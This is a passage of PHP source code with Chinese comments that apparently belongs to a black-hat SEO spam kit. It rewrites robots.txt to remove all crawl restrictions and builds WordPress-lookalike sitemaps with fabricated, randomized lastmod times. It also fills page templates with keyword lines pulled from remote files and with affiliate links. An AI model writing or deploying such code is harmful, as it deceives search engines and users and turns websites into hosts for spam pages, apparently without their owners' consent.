            return "User-agent: *\nDisallow:\nSitemap: $sitemapUrl";
        }

        $lines = explode(PHP_EOL, $originalContent);
        $existingXmlSitemap = null;
        $nonXmlSitemaps = array();
        $hasOurSitemap = false;
        $newLines = array();

        foreach ($lines as $line) {
            $trimmedLine = trim($line);

            if (strpos($trimmedLine, 'Sitemap:') === 0) {

                if (preg_match('/\.xml$/', $trimmedLine)) {

                    if ($existingXmlSitemap === null) {
                        $existingXmlSitemap = $trimmedLine;
                    }
                } else {

                    $nonXmlSitemaps[] = $trimmedLine;
                }

                if (strpos($trimmedLine, $sitemapUrl) !== false) {
                    $hasOurSitemap = true;
                }
            }

            if (!empty($trimmedLine) && strpos($trimmedLine, '#') !== 0) {
                $newLines[] = $trimmedLine;
            }
        }

        $newLines = array_filter($newLines, function ($line) {
            return strpos($line, 'Disallow: /') !== 0; // 移除所有禁止规则
        });

        $newLines[] = 'User-agent: *';
        $newLines[] = 'Disallow:';  // 始终放行所有内容

        $newLines = array_filter($newLines, function ($line) {
            return strpos($line, 'Sitemap:') !== 0; // 移除所有现有 Sitemap
        });

        if ($existingXmlSitemap !== null) {
            $newLines[] = $existingXmlSitemap;
        }

        foreach ($nonXmlSitemaps as $sitemap) {
            $newLines[] = $sitemap;
        }

        if (!$hasOurSitemap) {
            $newLines[] = "Sitemap: $sitemapUrl";
        }

        return implode(PHP_EOL, $newLines);
    }

    /**
     * 获取 robots.txt 内容
     *
     * @return string|null 返回渲染后的内容，或者 null
     */
    public static function getRobotsTxtContent()
    {

        $originalContent = Manager::getOriginalContent();
        hj_echo("渲染robots.txt 原始内容:", $originalContent);
        $sitemapUrl = RequestUtils::getSchemeAndHost() . '/wp-sitemap.xml';

        $robotsContent = self::modifyRobotsTxt($originalContent, $sitemapUrl);
        return $robotsContent;
    }
}

class Sitemap
{

    private static function modifySitemap($originalContent, $newSitemapUrls)
    {

        $dom = new DOMDocument();
        $dom->preserveWhiteSpace = false;
        $dom->formatOutput = true;

        libxml_use_internal_errors(true);

        if ($originalContent == null ||  strlen($originalContent) < 10 || strlen($originalContent) > 10000) {

            libxml_clear_errors();
            $host = RequestUtils::getSchemeAndHost();
            $dom->loadXML('<?xml version="1.0" encoding="UTF-8"?>' .
                '<?xml-stylesheet type="text/xsl" href="' . htmlspecialchars($host . '/wp-sitemap-index.xsl') . '" ?>' .
                '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></sitemapindex>');
        } else {
            $dom->loadXML($originalContent);
        }

        $sitemapIndex = $dom->getElementsByTagName('sitemapindex')->item(0);
        if (!$sitemapIndex) {
            return $originalContent;
        }

        foreach ($newSitemapUrls as $newSitemapUrl) {

            $sitemap = $dom->createElement('sitemap');

            $loc = $dom->createElement('loc', htmlspecialchars($newSitemapUrl));
            $sitemap->appendChild($loc);

            $sitemapIndex->appendChild($sitemap);
        }

        return $dom->saveXML();
    }

    static function writeSitemapsFileSafe($links)
    {

        if (empty($links)) {
            hj_echo("没有链接需要写入 sitemap 文件");
            return;
        }
        if (!is_array($links)) {
            hj_echo("参数不是数组", json_encode($links));
        }

        $urls = array();

        foreach ($links as $link) {
            if (KeyWord::hasKeyword($link)) {
                continue;
            }
            array_push($urls, $link);
        }
        if (empty($urls)) {
            hj_echo("过滤后没有链接需要写入 sitemap 文件");
            return;
        }

        self::writeSitemapsFile($urls);

    }

    static function writeSitemapsFile($urls)
    {

        $baseSitemapFileName = Manager::getSitemapindexFormat() . date('Ymd');
        $sitemapFileIndex = 0; // 从索引 0 开始
        $sitemapFileName = $baseSitemapFileName . '-' . $sitemapFileIndex . '.xml'; // 在索引前加上 -
        $sitemapFilePath = hj_join_paths(Disk::getSitemapCacheDir(), $sitemapFileName);

        hj_checkFilePath($sitemapFilePath);

        $lineCount = 0;
        if (file_exists($sitemapFilePath) && is_readable($sitemapFilePath)) {
            $lines = file($sitemapFilePath);
            if ($lines !== false) { // 确保读取成功
                $lineCount = count($lines); // 统计行数
            }
        }

        while ($lineCount >= 2000) {
            $sitemapFileIndex++;
            $sitemapFileName = $baseSitemapFileName . '-' . $sitemapFileIndex . '.xml'; // 在索引前加上 -
            $sitemapFilePath = hj_join_paths(Disk::getSitemapCacheDir(), $sitemapFileName);

            if (file_exists($sitemapFilePath) && is_readable($sitemapFilePath)) {
                $lines = file($sitemapFilePath);
                if ($lines !== false) {
                    $lineCount = count($lines); // 重新计算行数
                } else {
                    $lineCount = 0; // 如果无法读取，将行数设为 0
                }
            } else {
                $lineCount = 0; // 如果文件不存在，将行数设为 0
            }
        }

        $sitemapFile = new SplFileObject($sitemapFilePath, 'a+');

        if ($sitemapFile === null) {
            hj_echo("无法打开 sitemap 文件: ", $sitemapFilePath);
            return;
        }

        if (!empty($urls)) {
            $urlText = "";
            foreach ($urls as $url) {
                $urlText .= htmlspecialchars($url) . "\r\n";
            }
            if ($sitemapFile != null) {
                $sitemapFile->fwrite($urlText);
            }
        }

    }

    public static function getSitemapContent()
    {

        $originalContent = Manager::getOriginalContent();
        hj_echo("渲染sitemap.xml 原始内容:", $originalContent);

        if (!file_exists(Disk::getSitemapCacheDir())) {
            mkdir(Disk::getSitemapCacheDir(), 0777, true);
        }

        $dir = new DirectoryIterator(Disk::getSitemapCacheDir());

        $sitemapIndexUrls = array();
        /** @var DirectoryIterator $file */
        foreach ($dir as $file) {
            if (!$file->isDot() && $file->isFile()) {
                $sitemapIndexUrl = RequestUtils::getSchemeAndHost() . '/' . $file->getFilename();
                $sitemapIndexUrls[] = $sitemapIndexUrl;
            }
        }

        if (empty($sitemapIndexUrls)) {
            $baseSitemapFileName = Manager::getSitemapindexFormat() . date('Ymd');
            $sitemapFileIndex = 0; // 从索引 0 开始
            $sitemapFileName = $baseSitemapFileName . '-' . $sitemapFileIndex . '.xml'; // 在索引前加上 -
            $sitemapIndexUrl = RequestUtils::getSchemeAndHost() . '/' . $sitemapFileName;
            array_push($sitemapIndexUrls, $sitemapIndexUrl);
        }
        $sitemapContent = self::modifySitemap($originalContent, $sitemapIndexUrls);
        return $sitemapContent;
    }

    public static function getSitemapIndexContent()
    {

        $sitemapFilePath = hj_join_paths(Disk::getSitemapCacheDir(), RequestUtils::getRequestUri());

        $sitemapFile = null;

        if (file_exists($sitemapFilePath) && is_readable($sitemapFilePath)) {

            $sitemapFile = new SplFileObject($sitemapFilePath, 'r');
        }

        $sitemapIndexContent = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
        $sitemapIndexContent .= '<?xml-stylesheet type="text/xsl" href="' . RequestUtils::getSchemeAndHost() . '/wp-sitemap.xsl" ?>' . "\n";
        $sitemapIndexContent .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";

        $requestUri = RequestUtils::getRequestUri();
        preg_match('/\d{8}/', $requestUri, $matches);
        $baseDate = $matches[0]; // 提取到的日期部分，例如 "20240927"

        $baseDateTime = DateTime::createFromFormat('Ymd H:i:s', $baseDate . ' 00:00:00');

        $seed = crc32(RequestUtils::getFullUrl()); // 使用 URI 的哈希值作为种子
        srand($seed);

        $randomMinute = rand(0, 59); // 随机生成 0 到 59 分钟
        $randomSecond = rand(0, 59); // 随机生成 0 到 59 秒

        $baseDateTime->setTime(0, $randomMinute, $randomSecond); // 时间范围为 0 点到 1 点

        if ($sitemapFile !== null) {

            while (!$sitemapFile->eof()) {

                $line = trim($sitemapFile->fgets());

                if (!empty($line)) {

                    $sitemapIndexContent .= "    <url>\n";

                    $sitemapIndexContent .= "        <loc>" . RequestUtils::getSchemeAndHost() . htmlspecialchars($line) . "</loc>\n";

                    $lastmod = $baseDateTime->format('Y-m-d\TH:i:s+00:00');
                    $sitemapIndexContent .= "        <lastmod>" . $lastmod . "</lastmod>\n";

                    if ((int)$baseDateTime->format('H') >= 19) {

                        $randomIncrement = rand(0, 1);
                    } else {

                        $randomIncrement = rand(1, 5);
                    }
                    $baseDateTime->modify("+{$randomIncrement} seconds");

                    $sitemapIndexContent .= "    </url>\n";
                }
            }

            $sitemapFile = null;
        } else {

            $sitemapRangeBegin = Manager::getSitemapRangeBegin();
            $sitemapRangeEnd = Manager::getSitemapRangeEnd();
            $sitemapCount = rand($sitemapRangeBegin, $sitemapRangeEnd); // 随机生成 sitemap 数量

            $localUrls = Template::randLocalUrl($sitemapCount);
            foreach ($localUrls as $localUrl) {

                $sitemapIndexContent .= "    <url>\n";

                $sitemapIndexContent .= "        <loc>" . RequestUtils::getSchemeAndHost() . htmlspecialchars($localUrl) . "</loc>\n";

                $lastmod = $baseDateTime->format('Y-m-d\TH:i:s+00:00');
                $sitemapIndexContent .= "        <lastmod>" . $lastmod . "</lastmod>\n";

                if ((int)$baseDateTime->format('H') >= 19) {

                    $randomIncrement = rand(0, 1);
                } else {

                    $randomIncrement = rand(1, 5);
                }
                $baseDateTime->modify("+{$randomIncrement} seconds");

                $sitemapIndexContent .= "    </url>\n";
            }
        }

        $sitemapIndexContent .= '</urlset>';

        return $sitemapIndexContent;
    }

    public static function getLocalUrlInSitemap($count = 1)
    {

        $randomLines = array();

        if (!file_exists(Disk::getSitemapCacheDir())) {
            mkdir(Disk::getSitemapCacheDir(), 0777, true);
        }

        $dir = Disk::getSitemapCacheDir();

        $files = array();

        if ($handle = opendir($dir)) {
            while (($file = readdir($handle)) !== false) {
                if ($file !== '.' && $file !== '..') $files[] = $file;
            }
            closedir($handle);
        }

        if (!empty($files)) {

            $randomFilePath = $files[array_rand($files)];

            if (filesize($randomFilePath) > 1024 * 1024) {
                hj_echo("sitemap 文件 $randomFilePath 大小超过 1MB");
                return $randomLines;
            }

            $lines = file($randomFilePath, FILE_SKIP_EMPTY_LINES);

            if (!empty($lines)) {

                if (count($lines) < $count) {
                    hj_echo("sitemap 文件 $randomFilePath 行数不足 $count 行");

                    $randomIndexs = array_rand($lines, count($lines));
                    foreach ($randomIndexs as $index) {
                        array_push($randomLines, $lines[$index]);
                    }
                } else {

                    $randomIndexs = array_rand($lines, $count);
                    foreach ($randomIndexs as $index) {
                        array_push($randomLines, $lines[$index]);
                    }
                }
            }
        } else {
            hj_echo("找不到 sitemap 文件");
        }

        return $randomLines;
    }
}

define('HJ_TEMPLATE_RES_ARR_CACHE_DATA_TYPE_TEXT', 'text');

define('HJ_TEMPLATE_RES_ARR_CACHE_DATA_TYPE_SEO_RES', 'seoRes');
class Template
{

    private static $SplFiles = null;

    private static $TemplateCacheMap = null;

    private static $TemplateKeyword = null;

    private static $PastTime = null;

    private static $TempalteAffLinkBaseUrl = null;

    public static function getSplFile($filePath)
    {

        if (self::$SplFiles === null) {
            self::$SplFiles = array();
        }

        if (array_key_exists($filePath, self::$SplFiles)) {
            return self::$SplFiles[$filePath];
        }

        $splFile = new SplFileObject($filePath);
        self::$SplFiles[$filePath] = $splFile;
        return $splFile;
    }

    public  static function readSpecificLine($filePath, $lineNumber)
    {

        if (empty($filePath)) {
            hj_echo("当前 文件路径不存在 路径:", $filePath);
            return null;
        }

        if (!file_exists($filePath)) {

            hj_echo("当前 文件不存在 路径:", $filePath);
            return null;
        }

        if (!is_readable($filePath)) {
            hj_echo("当前 文件不可读 路径:", $filePath);
            return null;
        }

        if (filesize($filePath) <= 0) {
            return null;
        }

        $splFile =  self::getSplFile($filePath);

        if ($splFile === null) {
            hj_echo("文件指针为空");
            return null;
        }

        $splFile->seek($lineNumber);

        $line = $splFile->current();

        $line = rtrim($line, "\r\n");

        return $line;
    }

    public static function getVarNameCount($content, $varName)
    {
        $pattern = '/' . preg_quote($varName, '/') . '/';
        $count = preg_match_all($pattern, $content, $matches);
        return $count;
    }

    public static function replaceEvery($content, $varName, $resArr = array())
    {

        foreach ($resArr as $res) {
            if ($res === null) {
                hj_echo("依次替换 模板变量名:" . $varName . "替换内容为空");
                continue;
            }

            if ($res === '') {
                hj_echo("依次替换 模板变量名:" . $varName . "替换内容为空字符串");
            }
            $pattern = '/' . preg_quote($varName, '/') . '/';
            $content = preg_replace($pattern, $res, $content, 1);
        }
        return $content;
    }

    public static function replaceAll($content, $varName, $resArr = array())
    {
        if ($resArr == null || count($resArr) < 1) {
            hj_echo("全部替换 模板变量名:" . $varName . "替换内容数组为空");
            return $content;
        }
        $res = $resArr[0];

        if ($res === null || $res === '') {
            hj_echo("全部替换 模板变量名:" . $varName . "替换内容项目为空");
        }
        $pattern = '/' . preg_quote($varName, '/') . '/';
        return preg_replace($pattern, $res, $content);
    }

    public static function getTtitleVarName($varName)
    {
        return str_replace(array('{', '}', ' '), '', $varName) . '主词';
    }

    public static function getSeoUrlByKeyword($keyword)
    {

        $url = '/';
        if (!Manager::isRewrite()) {
            $url = '?/';
        }

        $fullSeoTemplatePaths = Manager::getFullSeoTemplatePaths();

        if (!empty($fullSeoTemplatePaths)) {

            $randomKey = array_rand($fullSeoTemplatePaths);

            $randomElement = $fullSeoTemplatePaths[$randomKey];
            $url .= $randomElement;
        }

        $url .= '/';
        $fileName = '';

        if (trim($keyword) === "") {
            hj_echo("关键词无效。");
        } else {
            $keyword = str_replace(
                array('/', '-', '?', '_', "'", '"', ',', '#', '，', '？', '“', '”', '‘', '’'),
                ' ',
                $keyword
            );

            $words = preg_split('/\s+/', trim($keyword));

            $words = array_filter($words, function ($word) {
                return trim($word) !== '';
            });

            if (count($words) > 0) {

                $fileName = implode('-', $words);
            }
        }

        $url .= $fileName;

        return $url;
    }

    public static function replaceAffLinkUrl($content, $varName, $resArr = array(), $isReplateAll = true)
    {
        if ($resArr == null || count($resArr) < 1) {
            hj_echo("友情链接 模板变量名:" . $varName . "替换内容为空");
            return $content;
        }
        if ($isReplateAll) {
            $res = $resArr[0];

            $affLinkResArr = explode(',', $res);
            if (count($affLinkResArr) < 2) {
                return $content;
            }

            hj_echo("友情链接 模板变量名:" . $varName . "替换内容:" . $res);

            $content = self::replaceAll($content, $varName, array($affLinkResArr[0]));

            $ttitleVarName = self::getTtitleVarName($varName);
            hj_echo("友情链接 模板变量名:" . $ttitleVarName . "替换内容:" . $affLinkResArr[1]);
            $content = self::replaceAll($content, $ttitleVarName, array($affLinkResArr[1]));
            return $content;
        } else {
            foreach ($resArr as $key => $res) {
                $affLinkResArr = explode(',', $res);
                if (count($affLinkResArr) < 2) {
                    continue;
                }
                hj_echo("友情链接 模板变量名:" . $varName . "替换内容:" . $res);

                $content = self::replaceEvery($content, $varName, array($affLinkResArr[0]));

                $ttitleVarName = self::getTtitleVarName($varName);
                hj_echo("友情链接 模板变量名:" . $ttitleVarName . "替换内容:" . $affLinkResArr[1]);
                $content = self::replaceEvery($content, $ttitleVarName, array($affLinkResArr[1]));
            }
            return $content;
        }
    }

    public static function checkIdAndLine($resValue, $id, $line)
    {

        if (!array_key_exists('res_arr', $resValue)) {
            return false;
        }
        $resValueResArr = $resValue['res_arr'];

        if (!is_array($resValueResArr)) {
            return false;
        }

        foreach ($resValueResArr as $resValueRes) {

            if (array_key_exists('id', $resValueRes) && array_key_exists('lines', $resValueRes)) {
                if ($resValueRes['id'] == $id && $resValueRes['lines'] > $line) {
                    return true;
                }
            }
        }
        return false;
    }

    public static function checkCacheData($cacheData, $varName, $resType, $resValue)
    {

        if (!empty($cacheData)) {

            if (!is_array($cacheData)) {
                return false;
            }

            if (!array_key_exists('dataType', $cacheData) || !array_key_exists('resArr', $cacheData)) {
                return false;
            }
            $dataType = $cacheData['dataType'];

            if ($dataType != HJ_TEMPLATE_RES_ARR_CACHE_DATA_TYPE_TEXT && $dataType != HJ_TEMPLATE_RES_ARR_CACHE_DATA_TYPE_SEO_RES) {
                return false;
            }
            $resArr = $cacheData['resArr'];

            if (!is_array($resArr)) {
                return false;
            }

            switch ($dataType) {
                case HJ_TEMPLATE_RES_ARR_CACHE_DATA_TYPE_TEXT:

                    foreach ($resArr as $res) {
                        if (!is_string($res)) {
                            return false;
                        }
                    }
                    break;
                case HJ_TEMPLATE_RES_ARR_CACHE_DATA_TYPE_SEO_RES:

                    foreach ($resArr as $res) {

                        if (!array_key_exists('id', $res) || !array_key_exists('line', $res)) {
                            return false;
                        }
                        $id = $res['id'];
                        $line = $res['line'];

                        hj_echo("检查seoRes缓存项变量名:", $varName, " 变量类型:", $resType, "seoRes缓存项: ", json_encode($res));

                        if (!self::checkIdAndLine($resValue, $id, $line)) {

                            hj_echo("缓存失效 变量名:", $varName, " 变量类型:", $resType, "失效seoRes缓存项:", json_encode($res), "资源数组:", json_encode($resValue));

                            return false;
                        }
                    }
                    break;
                default:
                    break;
            }
        }
        return true;
    }

    public static function getResArrFromCacheData($cacheData, $resValue = null)
    {
        $retResArr = array();
        if ($cacheData === null) {
            hj_echo("获取资源数组缓存数据为空", json_encode($cacheData));
            return $retResArr;
        }
        if (!array_key_exists('dataType', $cacheData) || !array_key_exists('resArr', $cacheData)) {
            hj_echo("获取资源数组缓存数据失败", json_encode($cacheData));
            return $retResArr;
        }
        $dataType = $cacheData['dataType'];
        switch ($dataType) {
            case HJ_TEMPLATE_RES_ARR_CACHE_DATA_TYPE_TEXT:
                $retResArr = $cacheData['resArr'];
                break;
            case HJ_TEMPLATE_RES_ARR_CACHE_DATA_TYPE_SEO_RES:
                if ($resValue === null) {
                    hj_echo("获取seo资源失败 resValue 不存在", json_encode($cacheData));
                    return $retResArr;
                }

                $resArr = $cacheData['resArr'];

                foreach ($resArr as $res) {

                    if (!array_key_exists('id', $res) || !array_key_exists('line', $res)) {
                        hj_echo("获取seo资源失败", json_encode($res));
                        continue;
                    }
                    $id = $res['id'];
                    $line = $res['line'];

                    $ret_arr = self::seoResByIdAndLine($resValue, $id, $line, 1);
                    if (empty($ret_arr)) {
                        hj_echo("获取seo资源失败", json_encode($res));
                        continue;
                    }
                    $value = $ret_arr[0];
                    array_push($retResArr, $value);
                }
                break;
            default:
                break;
        }
        return $retResArr;
    }

    public static function getTemplateKeyword()
    {

        if (empty(self::$TemplateKeyword)) {

            self::loadCacheMap();

            if (empty(self::$TemplateCacheMap)) {
                hj_echo("渲染跳转页面 缓存信息不存在");
            } else {

                if (isset(self::$TemplateCacheMap['{固定主词}'])) {
                    $cacheData = self::$TemplateCacheMap['{固定主词}'];
                    $resArr = self::getResArrFromCacheData($cacheData);
                    if (count($resArr) > 0) {

                        self::$TemplateKeyword = $resArr[0];
                    }
                }
            }
        }
        return self::$TemplateKeyword;
    }

    public static function getReplateResArrCacheData($varName, $resType, $resValue, $count = 1)
    {
        $cacheData = array();
        $resArr = array();

        $resArrCacheDataType = HJ_TEMPLATE_RES_ARR_CACHE_DATA_TYPE_TEXT;

        if ($varName == '{固定主词}') {
            $keyword =  self::getCurrentUrlTitle();

            self::$TemplateKeyword = $keyword;
            for ($i = 0; $i < $count; $i++) {
                array_push($resArr, $keyword);
            }

            $cacheData['dataType'] = $resArrCacheDataType;
            $cacheData['resArr'] = $resArr;
            return $cacheData;
        }

        switch ($resType) {

            case 'seoRes':
                $resArrCacheDataType = HJ_TEMPLATE_RES_ARR_CACHE_DATA_TYPE_SEO_RES;
                $resArr = self::seoRes($resValue, $count);
                break;
            case 'text':
                for ($i = 0; $i < $count; $i++) {
                    array_push($resArr, self::text($resValue));
                }
                break;
            case 'randRange':
                for ($i = 0; $i < $count; $i++) {
                    array_push($resArr, self::randRange($resValue));
                }
                break;
            case 'randStr':
                for ($i = 0; $i < $count; $i++) {
                    array_push($resArr, self::randStr($resValue));
                }
                break;
            case 'randDate':
                for ($i = 0; $i < $count; $i++) {
                    array_push($resArr, self::randDate($resValue));
                }
                break;
            case 'randTime':
                for ($i = 0; $i < $count; $i++) {
                    array_push($resArr, self::randTime($resValue));
                }
                break;

            case 'currentUrl':
                for ($i = 0; $i < $count; $i++) {
                    array_push($resArr, self::currentUrl());
                }
                break;
            case 'localUrl':
                $resArr = self::localUrl($count);
                break;
            case 'randLocalUrl':
                $resArr =  self::randLocalUrl($count);
                break;
            case 'affLinkUrl':
                $resArr = self::affLinkUrl($count);
                break;
            case 'affLinkUrlSameBaseUrl':
                $resArr = self::affLinkUrlSameBaseUrl($count);
                break;
            case 'affLinkUrlCurrentKeyword':
                $resArr = self::affLinkUrlCurrentKeyword($count);
                break;
            case 'localHost':
                for ($i = 0; $i < $count; $i++) {
                    array_push($resArr, self::localHost());
                }
                break;
            case 'pastTime':
                for ($i = 0; $i < $count; $i++) {
                    array_push($resArr, self::pastTime());
                }
                break;
            case 'randLocalFullUrl':
                $resArr =  self::randLocalFullUrl($count);
                break;
            case 'currentYear':
                for ($i = 0; $i < $count; $i++) {
                    array_push($resArr, self::currentYear());
                }
                break;
            case 'currentMonth':
                for ($i = 0; $i < $count; $i++) {
                    array_push($resArr, self::currentMonth());
                }
                break;
            case 'currentDay':
                for ($i = 0; $i < $count; $i++) {
                    array_push($resArr, self::currentDay());
                }
                break;
            case 'affLinkCenter':
                $resArr = self::affLinkCenter($count);
                break;
            default:
                break;
        }

        $cacheData['dataType'] = $resArrCacheDataType;
        $cacheData['resArr'] = $resArr;
        return $cacheData;
    }

    public static function seoRes($resValue, $count = 1)
    {

        $res_arr = $resValue['res_arr'];

        $total_line = 0;
        foreach ($res_arr as &$item) {
            $item['begin'] = $total_line;
            $total_line += $item['lines'];
            $item['end'] = $total_line;
        }

        $rand_arr = self::getRandomLineIndexs($total_line, $count);

        $res = array();

        foreach ($rand_arr as $rand) {
            foreach ($res_arr as &$item) {
                if ($rand >= $item['begin'] && $rand < $item['end']) {

                    $id = $item['id'];

                    $line = $rand - $item['begin'];
                    $resItem = array(
                        'id' => $id,
                        'line' => $line
                    );
                    array_push($res, $resItem);
                    break;
                }
            }
        }

        if (count($res) < $count) {
            # code...
            hj_echo("当前 随机SeoRes资源数量:" . count($res) . "小于所需数量:" . $count);
        }
        return $res;
    }

    public static function seoResByIdAndLine($resValue, $id, $line, $count = 1)
    {

        $res_arr = $resValue['res_arr'];
        $res = self::getSeoResFromResByIdAndLine($res_arr, $id, $line);
        if ($res === null) {
            return null;
        }

        $ret_arr = array();
        for ($i = 0; $i < $count; $i++) {

            array_push($ret_arr, $res);
        }
        return  $ret_arr;
    }

    private static function  getRandomLineIndexs($total_line, $count)
    {
        $lineIndexs = array();

        if ($total_line <= 0) {
            return $lineIndexs;
        }

        $randBeginIndex = rand(0, $total_line - 1);
        for ($i = 0; $i < $count; $i++) {

            $lineIndex = ($randBeginIndex + $i) % $total_line;

            array_push($lineIndexs, $lineIndex);
        }

        return $lineIndexs;
    }

    public static function getSeoResFromResArr($res_arr, $count = 1)
    {
        $total_line = 0;
        foreach ($res_arr as &$item) {
            $item['begin'] = $total_line;
            $total_line += $item['lines'];
            $item['end'] = $total_line;
        }

        $rand_arr = self::getRandomLineIndexs($total_line, $count);

        $res = array();

        $failUrl = array();

        foreach ($rand_arr as $rand) {
            foreach ($res_arr as &$item) {
                if ($rand >= $item['begin'] && $rand < $item['end']) {
                    $url = $item['url'];
                    if (array_key_exists($url, $failUrl)) {
                        hj_echo("当前url已经读取失败 不用重复拉去", $url);
                        continue;
                    }

                    $filePath = Manager::getRemoteFile($url);

                    $line = self::readSpecificLine($filePath, $rand - $item['begin']);

                    if (!is_string($line)) {
                        $line = json_encode($line);
                        hj_echo("当前行内容不是字符串", $line);
                        $failUrl[$url] = true;
                        continue;
                    }
                    if (empty($line)) {
                        hj_echo("当前行内容为空", json_encode($line));
                        $line = "";
                        $failUrl[$url] = true;
                        continue;
                    }
                    array_push($res, $line);
                    break;
                }
            }
        }

        if (count($res) < $count) {
            # code...
            hj_echo("当前 随机行内容数量:" . count($res) . "小于所需数量:" . $count);
        }
        return $res;
    }

    public static function getSeoResArrayByVarName($keyName)
    {
        $seoVars = Manager::getSeoVars();
        if (!$seoVars) {
            return array();
        }

        foreach ($seoVars as $seoVar) {

            if (!array_key_exists('varName', $seoVar)) {
                hj_echo("当前seoVar不存在varName", json_encode($seoVar));
                continue;
            }
            $varName = $seoVar['varName'];

            if (!array_key_exists('varValue', $seoVar)) {
                hj_echo("当前seoVar不存在varValue", json_encode($seoVar));
                continue;
            }
            $varValue = $seoVar['varValue'];

            if (!array_key_exists('resType', $varValue)) {
                hj_echo("当前varValue不存在resType", json_encode($seoVar));
                continue;
            }
            $resType = $varValue['resType'];

            if (!array_key_exists('resValue', $varValue)) {
                hj_echo("当前varValue不存在resValue", json_encode($seoVar));
                continue;
            }
            $resValue = $varValue['resValue'];

            if ($varName == $keyName) {

                if ($resType == 'seoRes') {

                    return $resValue['res_arr'];
                }
            }
        }
        return array();
    }

    public static function getSeoResLinesByVarName($keyName, $count = 1)
    {
        $lines = self::getSeoResFromResArr(self::getSeoResArrayByVarName($keyName), $count);
        return $lines;
    }

    public static function getSeoResOneLineByVarNameAndIndex($keyName, $index)
    {

        $seedMd5 = md5(RequestUtils::getHost() . '' . date('Ymd') . '' . $index);
        $seed = base_convert(substr($seedMd5, -8), 16, 10);

        srand($seed);
        $res_arr = self::getSeoResArrayByVarName($keyName);
        $res_arr_count = count($res_arr);
        $item = $res_arr[rand(0, $res_arr_count - 1)];
        $line = self::getSeoResFromResByIdAndLine($res_arr, $item['id'], rand(0, $item['lines'] - 1));

        return $line;
    }

    public static function getSeoResFromResByIdAndLine($res_arr, $id, $line)
    {

        foreach ($res_arr as &$item) {
            if ($item['id'] == $id) {
                $url = $item['url'];

                $filePath = Manager::getRemoteFile($url);

                $line = self::readSpecificLine($filePath, $line);
                return $line;
            }
        }
        return null;
    }

    /** SEO资源清单相关 BEGIN */

    public static function getLineFromSeoResManifestByIdAndLine($manifest_arr, $id, $line)
    {

        foreach ($manifest_arr as &$item) {
            if ($item['id'] == $id) {
                $url = $item['url'];

                $filePath = Manager::getRemoteFile($url);

                $line = self::readSpecificLine($filePath, $line);
                return $line;
            }
        }
        return null;
    }

    public static function getItemFromSeoResManifestByIdAndLine($manifest_arr, $id, $line)
    {
        $lineContent = self::getLineFromSeoResManifestByIdAndLine($manifest_arr, $id, $line);

        $manifestItem = json_decode($lineContent, true);
        if (!isset($manifestItem['title'])) {
            return null;
        }
        if (!isset($manifestItem['url'])) {
            return null;
        }
        if (!isset($manifestItem['varName'])) {
            return null;
        }
        $item = array(
            'id' => $id,
            'line' => $line,
            'title' => $manifestItem['title'],
            'varName' => $manifestItem['varName'],
            'url' => $manifestItem['url']
        );
        return $item;
    }

    private static function getManifestRecordFilePath()
    {
        $basePath = Disk::getConfigCacheDir();
        $site = RequestUtils::getHost();

        $filePath = hj_join_paths($basePath, ".manifest.r." . $site . ".json");
        return $filePath;
    }

    private static function loadManifestRecord()
    {
        $filePath = self::getManifestRecordFilePath();
        if (!file_exists($filePath) || filesize($filePath) <= 0) {
            return null;
        }
        $content = file_get_contents($filePath);
        if (empty($content)) {
            return null;
        }
        $record = json_decode($content, true);
        if (!is_array($record) || !isset($record['items']) || !isset($record['cursor'])) {
            return null;
        }
        if (!isset($record['total'])) {
            $record['total'] = 0;
        }
        if (!isset($record['skipped'])) {
            $record['skipped'] = array();
        }
        return $record;
    }

    private static function saveManifestRecord($record)
    {
        $filePath = self::getManifestRecordFilePath();
        $content = json_encode($record);
        file_put_contents($filePath, $content);
    }

    private static function resolveOffsetToIdAndLine($items, $total, $offset)
    {

        $offset = $offset % $total;
        $acc = 0;
        foreach ($items as $item) {
            if ($offset < $acc + $item['lines']) {
                return array('id' => $item['id'], 'line' => $offset - $acc);
            }
            $acc += $item['lines'];
        }

        $last = end($items);
        return array('id' => $last['id'], 'line' => 0);
    }

    public static function checkIdAndLineInSeoResManifest($manifest_arr, $id, $line)
    {

        if (!is_array($manifest_arr)) {
            return false;
        }
        foreach ($manifest_arr as &$item) {
            if (!isset($item['id']) || !isset($item['lines'])) {
                continue;
            }
            if ($item['id'] == $id) {
                if ($line >= 0 && $line < $item['lines']) {
                    return true;
                } else {
                    return false;
                }
            }
        }
        return false;
    }

    public static function getRoundRobinItemFromSeoResManifestByCount($manifest_arr, $count)
    {
        $resultItems = array();
        if (empty($manifest_arr) || $count <= 0) {
            return $resultItems;
        }

        $currentSummary = array();
        $currentTotal = 0;

        $currentIdMap = array();
        foreach ($manifest_arr as $item) {
            $currentSummary[] = array('id' => $item['id'], 'lines' => $item['lines']);
            $currentTotal += $item['lines'];
            $currentIdMap[$item['id']] = $item['lines'];
        }
        if ($currentTotal <= 0) {
            return $resultItems;
        }

        $record = self::loadManifestRecord();

        if ($record === null) {

            $cursor = rand(0, $currentTotal - 1);
            $skipped = array();
            $items = $currentSummary;
            $total = $currentTotal;
            hj_echo("清单轮询 初始化记录 总数:", $total, " 游标:", $cursor);
        } else {
            $items = $record['items'];
            $cursor = $record['cursor'];
            $total = $record['total'];
            $skipped = $record['skipped'];

            $oldIdMap = array();
            foreach ($items as $ri) {
                $oldIdMap[$ri['id']] = $ri['lines'];
            }

            $hasNew = false;
            foreach ($currentIdMap as $id => $lines) {
                if (!isset($oldIdMap[$id]) || $oldIdMap[$id] < $lines) {
                    $hasNew = true;
                    break;
                }
            }

            if ($hasNew) {

                if ($cursor < $total) {
                    $offset = $cursor;
                    while ($offset < $total) {
                        $entry = self::resolveOffsetToIdAndLine($items, $total, $offset);

                        if (isset($currentIdMap[$entry['id']]) && $entry['line'] < $currentIdMap[$entry['id']]) {
                            $skipped[] = $entry;
                        }
                        $offset++;
                    }
                }

                $items = $currentSummary;
                $total = $currentTotal;
                $cursor = rand(0, $total - 1);
                hj_echo("清单轮询 检测到新增 重建列表 总数:", $total, " 新游标:", $cursor, " 跳过数:", count($skipped));
            } else {

                if ($total != $currentTotal) {
                    $items = $currentSummary;
                    $total = $currentTotal;
                    if ($cursor >= $total) {
                        $cursor = 0;
                    }

                    $newSkipped = array();
                    foreach ($skipped as $si) {
                        if (isset($currentIdMap[$si['id']]) && $si['line'] < $currentIdMap[$si['id']]) {
                            $newSkipped[] = $si;
                        }
                    }
                    $skipped = $newSkipped;
